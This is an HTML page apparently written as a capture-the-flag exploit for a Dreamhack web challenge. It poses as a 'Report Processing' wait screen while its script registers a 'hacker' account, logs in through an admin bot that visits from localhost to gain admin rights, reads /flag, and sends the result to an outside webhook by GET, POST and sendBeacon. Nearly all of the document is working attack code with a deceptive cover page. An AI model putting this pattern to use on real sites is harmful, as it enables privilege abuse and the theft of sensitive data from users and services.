<!DOCTYPE html>
<html>
<head>
    <title>Report Processing</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Processing your report...</h1>
    <p>Please wait...</p>
    
    <script>
        (async () => {
            try {
                const username = 'hacker';
                const password = 'hacker123';
                
                // 1. 계정 등록 (이미 존재할 수 있으므로 에러 무시)
                try {
                    let formData = new FormData();
                    formData.append('username', username);
                    formData.append('password', password);
                    
                    await fetch('/register', {
                        method: 'POST',
                        body: formData,
                        credentials: 'include'
                    });
                } catch (e) {
                    // 이미 존재하는 계정일 수 있음
                }
                
                // 2. 로그인 (Bot이 127.0.0.1에서 요청하므로 is_admin=True가 됨)
                let formData = new FormData();
                formData.append('username', username);
                formData.append('password', password);
                
                await fetch('/login', {
                    method: 'POST',
                    body: formData,
                    credentials: 'include'
                });
                
                // 3. 로그인 완료 대기
                await new Promise(resolve => setTimeout(resolve, 800));
                
                // 4. FLAG 획득
                const response = await fetch('/flag', {
                    credentials: 'include'
                });
                
                const flag = await response.text();
                
                // 5. FLAG를 webhook으로 전송
                await fetch('https://gkxuwhb.request.dreamhack.games/?flag=' + encodeURIComponent(flag), {
                    mode: 'no-cors',
                    method: 'GET'
                });
                
                // 추가 전송 방법 (안전성 강화)
                await fetch('https://gkxuwhb.request.dreamhack.games/', {
                    mode: 'no-cors',
                    method: 'POST',
                    body: flag
                });
                
                // navigator.sendBeacon 사용 (더 안정적)
                navigator.sendBeacon('https://gkxuwhb.request.dreamhack.games/beacon', flag);
                
                console.log('Flag sent successfully');
                
            } catch (error) {
                console.error('Error:', error);
                
                // 에러 발생시에도 webhook으로 전송
                await fetch('https://gkxuwhb.request.dreamhack.games/?error=' + encodeURIComponent(error.message), {
                    mode: 'no-cors'
                });
            }
        })();
    </script>
</body>
</html>
